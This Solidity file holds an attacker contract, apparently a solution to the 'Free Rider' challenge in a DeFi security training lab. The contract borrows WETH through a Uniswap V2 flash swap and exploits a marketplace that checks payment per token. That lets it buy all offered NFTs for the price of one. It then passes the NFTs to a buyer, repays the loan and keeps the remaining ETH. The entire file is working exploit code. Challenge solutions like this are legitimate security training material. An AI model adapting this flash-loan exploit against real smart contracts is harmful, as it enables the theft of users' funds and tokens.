// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "hardhat/console.sol";

interface IMarketplace {
    function token() external view returns (IERC721);

    function amountOfOffers() external view returns (uint);

    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint wad) external;
}

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    address public owner;
    IMarketplace public market;
    address public buyer;
    IUniswapV2Pair public pair;
    IWETH public weth;

    uint public constant NFT_PRICE = 15 ether;

    constructor(IMarketplace _market, address _buyer, IUniswapV2Pair _pair, IWETH _weth) {
        owner = msg.sender;
        market = _market;
        buyer = _buyer;
        pair = _pair;
        weth = _weth;
    }

    function attack() external {
        require(msg.sender == owner, "not owner");
        // order depends on token address value, can't predict
        if (pair.token0() == address(weth)) {
            pair.swap(NFT_PRICE, 0, address(this), "x");
        } else {
            pair.swap(0, NFT_PRICE, address(this), "x");
        }
    }

    function uniswapV2Call(address, uint, uint, bytes calldata) override external {
        require(msg.sender == address(pair), "invalid callback caller");
        require(NFT_PRICE == weth.balanceOf(address(this)), "failed loan");
        weth.withdraw(NFT_PRICE);

        uint nftAmount = market.amountOfOffers();
        uint[] memory ids = new uint[](nftAmount);
        for (uint tokenId = 0; tokenId < nftAmount; tokenId++) ids[tokenId] = tokenId;
        market.buyMany{value : NFT_PRICE}(ids);

        IERC721 token = market.token();
        for (uint tokenId = 0; tokenId < nftAmount; tokenId++) {
            token.safeTransferFrom(address(this), buyer, tokenId);
        }

        uint returnAmount = NFT_PRICE * 1000_000 / 996_999;
        weth.deposit{value : returnAmount}();
        weth.transfer(address(pair), returnAmount);

        payable(owner).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
